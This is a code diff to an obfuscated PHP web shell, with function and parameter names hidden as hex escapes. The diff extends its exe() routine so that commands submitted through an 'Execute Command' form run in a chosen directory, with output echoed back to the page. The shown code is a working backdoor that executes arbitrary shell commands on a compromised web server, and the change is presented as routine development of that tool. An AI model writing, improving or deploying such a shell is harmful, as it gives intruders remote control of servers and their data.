@@ -79,17 +79,17 @@ if(!isset(${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x6
     <?php
     exit;
 }
-
-
-
 // --- FUNCTIONS ---
 function sanitizeFilename($filename) {
     global $f;
     return $f[5]($filename);
 }
 
-function exe($yu) {
+function exe($yu, $cwd = null) {
     global $f;
+    if ($cwd) {
+        $yu = "\x63\x64\x20" . escapeshellarg($cwd) . "\x20\x26\x26\x20" . $yu;
+    }
     if ($f[6]("\x65\x78\x65\x63")) {
         $f[7]($yu . "\x20\x32\x3e\x26\x31", $output);
         return $f[8]("\x0a", $output);
@@ -349,7 +349,7 @@ if (isset($_GET["\x61\x63\x74\x69\x6f\x6e"])) {
     echo '<div class="section-box">';
     switch ($_GET["\x61\x63\x74\x69\x6f\x6e"]) {
         case "\x63\x6d\x64":
-            $cmd_output = (isset($_POST["\x64\x6f\x5f\x63\x6d\x64"])) ? $f[28](exe($_POST["\x79\x75\x5f\x69\x6e\x70\x75\x74"])) : '';
+           $cmd_output = (isset($_POST["\x64\x6f\x5f\x63\x6d\x64"])) ? $f[28](exe($_POST["\x79\x75\x5f\x69\x6e\x70\x75\x74"], $path)) : '';
             echo '<h3>Execute Command</h3><form method="POST" action="?action=cmd&path='.$f[38]($path).'"><input type="text" name="yu_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus><input type="submit" name="do_cmd" value=">>" style="width: 70px;"></form>';
             if($cmd_output) echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>';
             break;
